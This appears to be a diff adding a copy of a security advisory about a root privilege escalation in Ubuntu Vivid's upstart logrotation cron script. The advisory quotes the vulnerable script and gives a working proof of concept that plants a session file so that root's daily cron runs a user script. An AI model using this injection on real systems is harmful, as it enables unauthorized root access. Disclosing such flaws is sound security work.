@@ -1,0 +1,40 @@
+Source: http://www.halfdog.net/Security/2015/UpstartLogrotationPrivilegeEscalation/
+
+## Introduction
+
+Problem description: Ubuntu Vivid 1504 (development branch) installs an insecure upstart logrotation script which will read user-supplied data from /run/user/[uid]/upstart/sessions and pass then unsanitized to an env command. As user run directory is user-writable, the user may inject arbitrary commands into the logrotation script, which will be executed during daily cron job execution around midnight with root privileges.
+
+## Methods
+
+The vulnerability is very easy to trigger as the logrotation script /etc/cron.daily/upstart does not perform any kind of input sanitation:
+
+
+#!/bin/sh
+
+# For each Upstart Session Init, emit "rotate-logs" event, requesting
+# the session Inits to rotate their logs. There is no user-daily cron.
+#
+# Doing it this way does not rely on System Upstart, nor
+# upstart-event-bridge(8) running in the Session Init.
+#
+# Note that system-level Upstart logs are handled separately using a
+# logrotate script.
+
+[ -x /sbin/initctl ] || exit 0
+
+for session in /run/user/*/upstart/sessions/*
+do
+    env $(cat $session) /sbin/initctl emit rotate-logs >/dev/null 2>&1 || true
+done
+
+On a system with e.g. libpam-systemd installed, standard login on TTY or via SSH will create the directory /run/user/[uid] writable to the user. By preparing a suitable session file, user supplied code will be run during the daily cron-jobs. Example:
+
+
+cat <<EOF > "${HOME}/esc"
+#!/bin/sh
+touch /esc-done
+EOF
+chmod 0755 "${HOME}/esc"
+
+mkdir -p /run/user/[uid]/upstart/sessions
+echo "- ${HOME}/esc" > /run/user/[uid]/upstart/sessions/x
